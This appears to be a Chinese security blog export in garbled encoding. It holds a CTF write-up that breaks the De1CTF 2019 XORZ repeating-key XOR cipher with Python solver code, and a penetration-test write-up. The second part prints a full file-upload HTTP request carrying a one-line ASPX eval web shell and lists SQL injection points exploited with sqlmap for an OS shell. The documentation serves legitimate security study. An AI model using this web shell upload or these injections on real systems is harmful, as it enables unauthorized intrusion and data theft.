<p>ç®€å•æ¥è¯´ æ±‰æ˜è·ç¦»åº¦é‡äº†é€šè¿‡æ›¿æ¢å­—ç¬¦çš„æ–¹å¼å°†å­—ç¬¦ä¸²xå˜æˆyæ‰€éœ€è¦çš„æœ€å°çš„æ›¿æ¢æ¬¡æ•°ã€‚</p>
<p>æ¯”å¦‚</p>
<p>1011101ä¸1001001 ä¹‹é—´çš„æ±‰æ˜è·ç¦»æ˜¯2ã€‚</p>
<blockquote>
<p>1011101 </p>
<p>1001001</p>
</blockquote>
<p>2143896ä¸2233796ä¹‹é—´çš„æ±‰æ˜è·ç¦»æ˜¯3ã€‚</p>
<blockquote>
<p>2143896</p>
<p>2233796</p>
</blockquote>
<p>â€œtonedâ€ä¸â€rosesâ€ä¹‹é—´çš„æ±‰æ˜è·ç¦»æ˜¯3ã€‚</p>
<blockquote>
<p>toned</p>
<p>roses</p>
</blockquote>
<p>å¿«é€Ÿæ±‚è§£æ±‰æ˜è·ç¦»çš„æ–¹æ³• å°±æ˜¯ å°†ç­‰é•¿å­—ç¬¦ä¸² è¿›è¡Œå¼‚æˆ–ã€‚ä¸¤ä¸ªäºŒè¿›åˆ¶å­—ç¬¦å¼‚æˆ–åè®¡ç®—å€¼ä¸º1çš„ æ¯”ç‰¹ä½æ ¼å¼ å°±æ˜¯æœ€åçš„æ±‰æ˜è·ç¦»ã€‚</p>
<h3 id="2019-De1CTF-XORZ"><a href="#2019-De1CTF-XORZ" class="headerlink" title="2019 De1CTF XORZ"></a>2019 De1CTF XORZ</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> data <span class="keyword">import</span> flag,plain</span><br><span class="line"> </span><br><span class="line">key=flag.strip(<span class="string">&quot;de1ctf&#123;&quot;</span>).strip(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(key&lt;<span class="number">38</span>))</span><br><span class="line">salt=<span class="string">&quot;WeAreDe1taTeam&quot;</span></span><br><span class="line">ki=cycle(key)</span><br><span class="line">si=cycle(salt)</span><br><span class="line">cipher = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(p) ^ <span class="built_in">ord</span>(<span class="built_in">next</span>(ki)) ^ <span class="built_in">ord</span>(<span class="built_in">next</span>(si)))[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> p <span class="keyword">in</span> plain])</span><br><span class="line"><span class="built_in">print</span> cipher</span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"><span class="comment"># 49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c</span></span><br></pre></td></tr></table></figure>



<h4 id="å»ç›"><a href="#å»ç›" class="headerlink" title="å»ç›"></a>å»ç›</h4><p>key 38ä¸ªåå…­è¿›åˆ¶æ•°  30ä¸ªæœªçŸ¥å­—ç¬¦</p>
<p>c = p ^ ki ^ si</p>
<p>å·²çŸ¥ci </p>
<p>salt key éƒ½æ˜¯å¾ªç¯åˆ©ç”¨çš„</p>
<p>saltæ˜¯å·²çŸ¥çš„ æ‰€ä»¥å…ˆå°†saltå±‚ å¼‚æˆ–å»æ‰  å¾—åˆ° si</p>
<p>c ^ si = p ^ ki </p>
<p>c å’Œ siæ˜¯ å·²çŸ¥çš„  æ‰€ä»¥å¯ä»¥æ±‚å‡ºæ¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="string">&#x27;49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c&#x27;</span></span><br><span class="line">salt = <span class="string">&quot;WeAreDe1taTeam&quot;</span></span><br><span class="line">si2 = cycle(salt)</span><br><span class="line">nosalt = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(c)/<span class="number">2</span>)):</span><br><span class="line">    temp = c[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>]</span><br><span class="line">    <span class="comment"># print(binascii.a2b_hex(temp))</span></span><br><span class="line">    temphex_int = <span class="built_in">ord</span>(binascii.a2b_hex(temp).decode())</span><br><span class="line">    <span class="comment"># p = chr(temphex_int ^ ord(next(si2)) ^ ord(next(ki2)))</span></span><br><span class="line">    temp_re = <span class="built_in">hex</span>(temphex_int ^ <span class="built_in">ord</span>(<span class="built_in">next</span>(si2)))[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">    nosalt = nosalt + temp_re</span><br></pre></td></tr></table></figure>



<h4 id="çŒœè§£å¯†é’¥é•¿åº¦"><a href="#çŒœè§£å¯†é’¥é•¿åº¦" class="headerlink" title="çŒœè§£å¯†é’¥é•¿åº¦"></a>çŒœè§£å¯†é’¥é•¿åº¦</h4><p>keyé•¿åº¦å°äº38 å…¶ä¸­å·²çŸ¥ä½æ•°8ä½  æ‰€ä»¥æœªçŸ¥ä½æ•°å°äº30</p>
<p>å¯ä»¥ä½¿ç”¨æ±‰æ˜è·ç¦» å»çŒœè§£å¯†é’¥é•¿åº¦</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hamming(&quot;1010&quot;, &quot;1111&quot;) == 2</span><br><span class="line">hamming(&quot;1111&quot;, &quot;0000&quot;) == 4</span><br><span class="line">hamming(&quot;1111&quot;, &quot;1111&quot;) == 0</span><br></pre></td></tr></table></figure>

<p>æ±‰æ˜è·ç¦» ä¸ å¯†é’¥é•¿åº¦çŒœè§£ä¹‹é—´çš„è”ç³»ï¼š</p>
<p>ä¸¤ä¸ªä»¥ Asciiç¼–ç çš„è‹±æ–‡å­—ç¬¦ ä¹‹é—´çš„æ±‰æ˜è·ç¦»æ˜¯ 2<del>3  æ‰€ä»¥æ­£å¸¸è‹±æ–‡å­—æ¯çš„è¯„ä»·æ±‰æ˜è·ç¦»ä¸º 2</del>3 ã€æ¯æ¯”ç‰¹ã€‘ï¼Œä»»æ„å­—ç¬¦ï¼ˆéçº¯å­—æ¯ï¼‰çš„ä¸¤ä¸¤æ±‰æ˜è·ç¦» å¹³å‡ä¸º4ã€‚</p>
<blockquote>
<p>å¤§å†™å­—æ¯A-Z  ascii  65-90        65å¯¹åº”äºŒè¿›åˆ¶ 01000001  90å¯¹åº”äºŒè¿›åˆ¶ 01011010 </p>
<p>å°å†™å­—æ¯a-z   ascii  97-122        </p>
<p>65å¯¹åº”äºŒè¿›åˆ¶ 01000001  </p>
<p>90å¯¹åº”äºŒè¿›åˆ¶ 01011010   å­—æ¯æ±‰æ˜è·ç¦»å¹³å‡ä¸º2-3</p>
</blockquote>
<p>æ­£ç¡®åˆ†ç»„çš„å¯†æ–‡ä¸å¯†æ–‡ç›´æ¥çš„æ±‰æ˜è·ç¦» ç­‰äºæ˜æ–‡ä¸æ˜æ–‡ä¹‹é—´çš„æ±‰æ˜è·ç¦»ã€é€šè¿‡æŒ‰æ­£ç¡®å¯†é’¥é•¿åº¦åˆ†ç»„çš„å¯†æ–‡ä¸å¯†æ–‡å¼‚æˆ–ç­‰äºæ˜æ–‡ä¸æ˜æ–‡å¼‚æˆ–è¯æ˜ã€‘</p>
<p>æ‰€ä»¥ å½“ä½¿ç”¨æ­£ç¡®çš„å¯†é’¥é•¿åº¦åï¼Œä¸¤ä¸¤å­—æ¯è¿›è¡Œè®¡ç®—æ±‰æ˜è·ç¦»ï¼Œè¿™ä¸ªå€¼ä¼šè¶‹äºæœ€å°ã€‚</p>
<h4 id="å¯†æ–‡è§£å¯†"><a href="#å¯†æ–‡è§£å¯†" class="headerlink" title="å¯†æ–‡è§£å¯†"></a>å¯†æ–‡è§£å¯†</h4><p>1.å¼‚æˆ–åŠ å¯†ä¸­  ä½¿ç”¨ç›¸åŒå¯†é’¥åŠ å¯†çš„æ˜æ–‡å’Œå¯†æ–‡åŠ å­˜åœ¨è¿™ä¸ªè§„å¾‹ï¼š  å¯†æ–‡å’Œå¯†æ–‡å¼‚æˆ– ç­‰äº æ˜æ–‡å’Œæ˜æ–‡å¼‚æˆ–ã€‚</p>
<p>2.ç©ºæ ¼å’Œæ‰€æœ‰å°å†™å­—æ¯å¼‚æˆ–çš„ç»“æœæ˜¯å¯¹åº”çš„å¤§å†™å­—æ¯ï¼› ç©ºæ ¼å’Œæ‰€æœ‰å¤§å†™å­—æ¯ å¼‚æˆ–çš„ç»“æœæ˜¯å¯¹åº”çš„å°å†™å­—æ¯ã€‚é™¤ç©ºæ ¼å¤–ï¼Œæœ‰äº›ç»„åˆå¯å‡ºç°å¼‚æˆ–ç»“æœæ˜¯å¤§å°å†™å­—æ¯ï¼Œä½†æ˜¯ç©ºæ ¼å‡ºç°æ—¶ï¼Œç»“æœåœ¨å¤§å°å†™å­—æ¯é—´çš„æ¦‚ç‡æœ€å¤§ã€‚</p>
<p>3.ä¸¤ä¸ªä»¥asciiç¼–ç çš„è‹±æ–‡å­—ç¬¦çš„æ±‰æ˜è·ç¦»æ˜¯2-3ä¹‹é—´ï¼Œä¹Ÿå°±æ˜¯è¯´æ­£å¸¸è‹±æ–‡å­—æ¯çš„å¹³å‡æ±‰æ˜è·ç¦»ä¸º2-3ï¼ˆæ¯æ¯”ç‰¹ï¼‰ï¼Œä»»æ„å­—ç¬¦ï¼ˆéçº¯å­—æ¯ï¼‰çš„ä¸¤ä¸¤æ±‰æ˜è·ç¦»å¹³å‡ä¸º4ã€‚</p>
<p>4.åœ¨ç ´è§£è¿™ç±»é—®é¢˜çš„ä¸‰æ­¥èµ°ï¼šçŒœè§£å¯†é’¥é•¿åº¦ï¼›æ ¹æ®å¯†é’¥é•¿åº¦åˆ†ç»„ï¼Œä¾æ¬¡æ±‚è§£å¯†é’¥æ¯ä¸ªå­—èŠ‚å¾—å‡ºå¯†é’¥ï¼›æœ€åæ ¹æ®å¯†é’¥è¿˜åŸå‡ºæ˜æ–‡ã€‚</p>
<p>ç›´æ¥ç”¨æ–‡ç« çš„è„šæœ¬ <a href="https://www.anquanke.com/post/id/161171#h2-0">https://www.anquanke.com/post/id/161171#h2-0</a>  å½“ç„¶é¢˜ç›®å’Œè¿™ä¸ªæ˜¯ä¸ä¸€æ ·çš„ ä½†æ˜¯å»ç›åå°±æ˜¯åŒä¸€ç±»é¢˜ç›®</p>
<p> åé¢ç¨åŠ å˜åŠ¨å³å¯ å­¦ä¹ ä¸‹è¿™ç§æ€è·¯</p>
<h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bxor</span>(<span class="params">a, b</span>):     <span class="comment"># xor two byte strings of different lengths</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a) &gt; <span class="built_in">len</span>(b):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a[:<span class="built_in">len</span>(b)], b)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b[:<span class="built_in">len</span>(a)])])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hamming_distance</span>(<span class="params">b1, b2</span>):</span><br><span class="line">    differing_bits = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> bxor(b1, b2):</span><br><span class="line">        differing_bits += <span class="built_in">bin</span>(byte).count(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> differing_bits</span><br><span class="line"></span><br><span class="line"><span class="comment"># text = &#x27;&#x27;</span></span><br><span class="line"><span class="comment"># with open(&quot;6.txt&quot;,&quot;r&quot;) as f:</span></span><br><span class="line"><span class="comment">#     for line in f:</span></span><br><span class="line"><span class="comment">#         text += line</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b = base64.b64decode(text)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">break_single_key_xor</span>(<span class="params">text</span>):</span><br><span class="line">    key = <span class="number">0</span></span><br><span class="line">    possible_space=<span class="number">0</span></span><br><span class="line">    max_possible=<span class="number">0</span></span><br><span class="line">    letters = string.ascii_letters.encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(text)):</span><br><span class="line">        maxpossible = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(text)):</span><br><span class="line">            <span class="keyword">if</span>(a == b):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            c = text[a] ^ text[b]</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> letters <span class="keyword">and</span> c != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            maxpossible += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> maxpossible&gt;max_possible:</span><br><span class="line">            max_possible=maxpossible</span><br><span class="line">            possible_space=a</span><br><span class="line">    key = text[possible_space]^ <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c=<span class="string">&#x27;49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c&#x27;</span></span><br><span class="line">salt=<span class="string">&quot;WeAreDe1taTeam&quot;</span></span><br><span class="line">si2=cycle(salt)</span><br><span class="line">nosalt=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(c)/<span class="number">2</span>)):</span><br><span class="line">    temp=c[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>]</span><br><span class="line">    <span class="comment"># print(binascii.a2b_hex(temp))</span></span><br><span class="line">    temphex_int=<span class="built_in">ord</span>(binascii.a2b_hex(temp).decode())</span><br><span class="line">    <span class="comment"># p = chr(temphex_int ^ ord(next(si2)) ^ ord(next(ki2)))</span></span><br><span class="line">    temp_re= <span class="built_in">hex</span>(temphex_int ^ <span class="built_in">ord</span>(<span class="built_in">next</span>(si2)))[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">    nosalt=nosalt+temp_re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b=binascii.a2b_hex(nosalt)</span><br><span class="line"></span><br><span class="line">normalized_distances = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">40</span>):</span><br><span class="line">    <span class="comment">#æˆ‘ä»¬å–å…¶ä¸­å‰6æ®µè®¡ç®—å¹³å±€æ±‰æ˜è·ç¦»</span></span><br><span class="line">    b1 = b[: KEYSIZE]</span><br><span class="line">    b2 = b[KEYSIZE: KEYSIZE * <span class="number">2</span>]</span><br><span class="line">    b3 = b[KEYSIZE * <span class="number">2</span>: KEYSIZE * <span class="number">3</span>]</span><br><span class="line">    b4 = b[KEYSIZE * <span class="number">3</span>: KEYSIZE * <span class="number">4</span>]</span><br><span class="line">    b5 = b[KEYSIZE * <span class="number">4</span>: KEYSIZE * <span class="number">5</span>]</span><br><span class="line">    b6 = b[KEYSIZE * <span class="number">5</span>: KEYSIZE * <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">    normalized_distance = <span class="built_in">float</span>(</span><br><span class="line">        hamming_distance(b1, b2) +</span><br><span class="line">        hamming_distance(b2, b3) +</span><br><span class="line">        hamming_distance(b3, b4) +</span><br><span class="line">        hamming_distance(b4, b5) +</span><br><span class="line">        hamming_distance(b5, b6)</span><br><span class="line">    ) / (KEYSIZE * <span class="number">5</span>)</span><br><span class="line">    normalized_distances.append(</span><br><span class="line">        (KEYSIZE, normalized_distance)</span><br><span class="line">    )</span><br><span class="line">normalized_distances = <span class="built_in">sorted</span>(normalized_distances,key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE,_ <span class="keyword">in</span> normalized_distances[:<span class="number">5</span>]:</span><br><span class="line">    block_bytes = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(KEYSIZE)]</span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(b):</span><br><span class="line">        block_bytes[i % KEYSIZE].append(byte)</span><br><span class="line">    keys = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> bbytes <span class="keyword">in</span> block_bytes:</span><br><span class="line">            keys += break_single_key_xor(bbytes)</span><br><span class="line">        key = <span class="built_in">bytearray</span>(keys * <span class="built_in">len</span>(b), <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        plaintext = bxor(b, key)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;keysize:&quot;</span>, KEYSIZE)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;key is:&quot;</span>, keys, <span class="string">&quot;n&quot;</span>)</span><br><span class="line">        s = <span class="built_in">bytes</span>.decode(plaintext)</span><br><span class="line">        <span class="built_in">print</span>(s)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://fitzbc.github.io/2019/08/04/De1CTF-xorz-Writeup/">https://fitzbc.github.io/2019/08/04/De1CTF-xorz-Writeup/</a></p>
<p><a href="https://www.anquanke.com/post/id/161171#h2-0">https://www.anquanke.com/post/id/161171#h2-0</a> </p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»æ–‡ä»¶æ³„éœ²ä»£ç å®¡è®¡åˆ°Getshell</title>
    <url>/posts/34084a97/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æŸæ¬¡é¡¹ç›®ä¸­å®¢æˆ·è¦æ±‚åœ¨äº’è”ç½‘ä¾§è¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œå¥ˆä½•è‚äº†ä¸¤å¤©ä¹Ÿæ²¡æ‰¾åˆ°ä¸ªé«˜å±æ¼æ´ï¼Œæ²¡åŠæ³•å¤ªèœäº†ã€‚</p>
<p>å¶ç„¶é—´ç«¯å£æ‰«æåï¼Œæ‰«ç›®å½•å‘ç°äº†ä¸¤ä¸ªbin.rarï¼Œè¿™ä¸‹å’Œå®¢æˆ·æœ‰å¾—äº¤ä»£äº†ï¼ï¼ï¼</p>
<p><img src="/posts/34084a97/1.png" alt="image-20240222171901823"></p>
<p>è§£å‹åä¸ºå¤šä¸ªdllæ–‡ä»¶ï¼Œä½¿ç”¨ILspyè¿›è¡Œåç¼–è¯‘Android.dll</p>
<p><img src="/posts/34084a97/2.png" alt="image-20240222171920337"></p>
<h2 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h2><p>å¼€å§‹ .netä»£ç å®¡è®¡</p>
<p><img src="/posts/34084a97/3.png" alt="æˆªå›¾"></p>
<p><img src="/posts/34084a97/4.png" alt="image-20240222171947564"></p>
<h3 id="æ—¥å¿—æ³„éœ²"><a href="#æ—¥å¿—æ³„éœ²" class="headerlink" title="æ—¥å¿—æ³„éœ²"></a>æ—¥å¿—æ³„éœ²</h3><p>ä»£ç å®¡è®¡åå‘ç°å­˜åœ¨ä¸€ä¸ª log.txt æ—¥å¿—æ³„éœ²  è®°å½•ç€è¯·æ±‚æ—¥å¿—</p>
<p><img src="/posts/34084a97/5.png" alt="image-20240222171959681"></p>
<p><img src="/posts/34084a97/6.png" alt="image-20240222172017042"></p>
<h3 id="æœªæˆæƒæ–‡ä»¶ä¸Šä¼ æœåŠ¡"><a href="#æœªæˆæƒæ–‡ä»¶ä¸Šä¼ æœåŠ¡" class="headerlink" title="æœªæˆæƒæ–‡ä»¶ä¸Šä¼ æœåŠ¡"></a>æœªæˆæƒæ–‡ä»¶ä¸Šä¼ æœåŠ¡</h3><p><img src="/posts/34084a97/7.png" alt="image-20240222172109037"></p>
<p>è®¿é—® <a href="http://xx.xx.xx.xx/UploadByFile.aspx">http://xx.xx.xx.xx/UploadByFile.aspx</a>  é€šè¿‡è¯»æºç å·²ç»ç»™å‡ºäº†ä¸Šä¼ å¯†ç lkï¼Œè¾“å…¥å¯†ç åå¯ä»¥ä¸Šä¼ åˆ°äººå‘˜æŒ‡å®šç›®å½•ä¸‹</p>
<p> <img src="/posts/34084a97/8.png" alt="image-20240222172122212"></p>
<h3 id="ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a href="#ä»»æ„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="ä»»æ„æ–‡ä»¶ä¸Šä¼ "></a>ä»»æ„æ–‡ä»¶ä¸Šä¼ </h3><p><img src="/posts/34084a97/9.png" alt="image-20240222172142497"></p>
<p>æ„é€ æ–‡ä»¶ä¸Šä¼ æ•°æ®åŒ…è¿›è¡Œfuzz  ä¼šä¸Šä¼ åˆ°/UpPhoto ç›®å½•ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /UploadAndroid.aspx HTTP/1.1</span><br><span class="line">Host: xx.xx.xx.xx:8500</span><br><span class="line">Content-Length: 345</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: null</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGxb4OzDF9eaemiFU</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh,zh-CN;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryGxb4OzDF9eaemiFU</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;1.aspx&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br><span class="line">------WebKitFormBoundaryGxb4OzDF9eaemiFU</span><br></pre></td></tr></table></figure>

<p><img src="/posts/34084a97/10.png" alt="image-20240222172158143"></p>
<p>ä¸Šä¼ æˆåŠŸè¿æ¥èšå‰‘ getshell</p>
<p><img src="/posts/34084a97/11.png" alt="image-20240222172210227"></p>
<h3 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h3><p>ä¸¤ä¸ªæ³„éœ²çš„dllä¸­éƒ½å­˜åœ¨å¾ˆå¤šsqlæ³¨å…¥ï¼Œæ²¡æœ‰è¿›è¡Œè¿‡æ»¤å¤„ç†ï¼Œæ¨æµ‹è¿™ä¸¤ä¸ªç«¯å£æœåŠ¡å‡ä¸ºAPIæ¥å£</p>
<p><img src="/posts/34084a97/12.png" alt="image-20240222172224240"></p>
<p>æ­¤å¤„ strYear æœªç»è¿‡å¤„ç† å­˜åœ¨sqlæ³¨å…¥  <a href="http://xx.xx.xx.xx:85/GetInfoxxxx.aspx?year=2">http://xx.xx.xx.xx:85/GetInfoxxxx.aspx?year=2</a></p>
<p>è¿˜å­˜åœ¨å…¶ä»–å¤šå¤„æ³¨å…¥ç‚¹</p>
<p><img src="/posts/34084a97/13.png" alt="image-20240222172236311"></p>
<p><img src="/posts/34084a97/14.png" alt="image-20240222172248521"></p>
<hr>
<p>åœ¨å¦ä¸€å¤„ç«¯å£ä»£ç æ³„éœ²ä¸­ä¹Ÿå­˜åœ¨å¤šå¤„sqlæ³¨å…¥ æœªç»è¿‡å¤„ç†çš„åœ°æ–¹å¾ˆå¤šå°±ä¸åœ¨åˆ—ä¸¾ã€‚ã€‚ã€‚åŸºæœ¬ä¸ŠstrXXã€XXIDã€yearã€dataéƒ½å¯ä»¥æ³¨å…¥</p>
<p><img src="/posts/34084a97/15.png" alt="image-20240222172300435"></p>
<p><img src="/posts/34084a97/16.png" alt="image-20240222172313086"></p>
<p><a href="http://xx.xx.xx.xx/XXXX/XXXX/GetFileReviewEdit.aspx?strFWID=1">http://xx.xx.xx.xx:80/XXXX/XXXX/GetFileReviewEdit.aspx?strFWID=1</a></p>
<p><a href="http://xx.xx.xx.xx/XXXX/XXXX/GetFileReviewList.aspx?strName=1">http://xx.xx.xx.xx:80/XXXX/XXXX/GetFileReviewList.aspx?strName=1</a></p>
<p><img src="/posts/34084a97/17.png" alt="image-20240222172322699"></p>
<p><img src="/posts/34084a97/18.png" alt="image-20240222172333809"></p>
<p>sqlmapå¯ä»¥ç›´æ¥æ³¨å…¥è·å–æ•°æ®å¹¶os-shell</p>
<p><img src="/posts/34084a97/19.png" alt="image-20240222172347493"></p>
